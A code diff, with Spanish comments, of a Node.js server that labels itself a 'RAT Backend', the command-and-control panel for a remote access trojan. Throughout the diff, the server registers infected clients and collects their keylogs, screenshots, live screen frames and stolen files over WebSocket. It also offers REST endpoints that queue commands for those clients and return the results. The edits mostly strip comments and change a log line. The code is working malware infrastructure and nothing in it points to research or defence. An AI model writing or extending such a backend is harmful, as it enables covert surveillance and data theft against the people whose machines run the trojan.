@@ -11,8 +11,8 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 
-// Base de datos SQLite
 const db = new sqlite3.Database(path.join(__dirname, 'rats.db'));
+
 db.run(`CREATE TABLE IF NOT EXISTS clients (
   id TEXT PRIMARY KEY,
   customName TEXT,
@@ -36,7 +36,6 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 const activeClients = new Map();
 
-// ============ WEBSOCKET ============
 wss.on('connection', (ws, req) => {
   const clientId = req.headers['x-client-id'] || 'unknown-' + Date.now();
   const ip = req.socket.remoteAddress || '0.0.0.0';
@@ -67,7 +66,6 @@ wss.on('connection', (ws, req) => {
         db.run(`UPDATE clients SET lastSeen = ? WHERE id = ?`, [Date.now(), clientId]);
       }
 
-      // ===== GUARDAR RESULTADOS DE COMANDOS =====
       if (data.type === 'cmd_result') {
         db.get(
           `SELECT id FROM commands WHERE clientId = ? AND status = 'pending' ORDER BY timestamp DESC LIMIT 1`,
@@ -89,7 +87,6 @@ wss.on('connection', (ws, req) => {
         );
       }
 
-      // ===== SCREENSHOT =====
       if (data.type === 'screenshot_result') {
         db.run(
           `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'screenshot', ?, 'done', ?)`,
@@ -98,7 +95,6 @@ wss.on('connection', (ws, req) => {
         console.log(`[+] Screenshot guardado para ${clientId}`);
       }
 
-      // ===== STREAM FRAME =====
       if (data.type === 'stream_frame') {
         db.run(
           `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'stream', ?, 'done', ?)`,
@@ -107,17 +103,14 @@ wss.on('connection', (ws, req) => {
         console.log(`[+] Stream frame recibido de ${clientId}`);
       }
 
-      // ===== KEYLOG =====
       if (data.type === 'keylog') {
-        console.log(`[+] Keylog de ${clientId}: ${data.text}`);
-        // Guardar keylog en tabla separada si se desea
         db.run(
           `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'keylog', ?, 'done', ?)`,
           [clientId, data.text, Date.now()]
         );
+        console.log(`[+] Keylog de ${clientId}: ${data.text.substring(0, 50)}...`);
       }
 
-      // ===== FILE DOWNLOAD =====
       if (data.type === 'file_download') {
         db.run(
           `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'files', ?, 'done', ?)`,
@@ -126,7 +119,6 @@ wss.on('connection', (ws, req) => {
         console.log(`[+] Archivo ${data.filename} recibido (${data.size} bytes)`);
       }
 
-      // ===== INFO =====
       if (data.type === 'info') {
         db.run(`UPDATE clients SET os = ? WHERE id = ?`, [data.os, clientId]);
         console.log(`[+] Info de ${clientId}: ${data.os}`);
@@ -144,9 +136,6 @@ wss.on('connection', (ws, req) => {
   });
 });
 
-// ============ API REST ============
-
-// Obtener lista de clientes
 app.get('/api/clients', (req, res) => {
   db.all('SELECT * FROM clients ORDER BY lastSeen DESC', (err, rows) => {
     if (err) return res.status(500).json({ error: err.message });
@@ -158,7 +147,6 @@ app.get('/api/clients', (req, res) => {
   });
 });
 
-// Renombrar cliente
 app.post('/api/rename', (req, res) => {
   const { id, customName } = req.body;
   if (!id || !customName) return res.status(400).json({ error: 'Faltan datos' });
@@ -168,7 +156,6 @@ app.post('/api/rename', (req, res) => {
   });
 });
 
-// Enviar comando a un cliente
 app.post('/api/command', (req, res) => {
   const { clientId, command, params } = req.body;
   if (!clientId || !command) return res.status(400).json({ error: 'Faltan datos' });
@@ -186,7 +173,6 @@ app.post('/api/command', (req, res) => {
   res.json({ ok: true, cmdId });
 });
 
-// Obtener historial de comandos de un cliente
 app.get('/api/commands/:clientId', (req, res) => {
   const { clientId } = req.params;
   db.all('SELECT * FROM commands WHERE clientId = ? ORDER BY timestamp DESC LIMIT 50',
@@ -196,7 +182,6 @@ app.get('/api/commands/:clientId', (req, res) => {
     });
 });
 
-// Obtener comandos específicos por tipo (ej: screenshots, streams)
 app.get('/api/commands/:clientId/:type', (req, res) => {
   const { clientId, type } = req.params;
   db.all('SELECT * FROM commands WHERE clientId = ? AND command = ? ORDER BY timestamp DESC LIMIT 20',
@@ -206,7 +191,6 @@ app.get('/api/commands/:clientId/:type', (req, res) => {
     });
 });
 
-// Ruta raíz
 app.get('/', (req, res) => {
   res.json({
     status: 'RAT Backend running',
@@ -215,7 +199,6 @@ app.get('/', (req, res) => {
   });
 });
 
-// Iniciar servidor
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`[+] Servidor RAT backend corriendo en puerto ${PORT}`);
   console.log(`[+] Clientes activos: 0`);
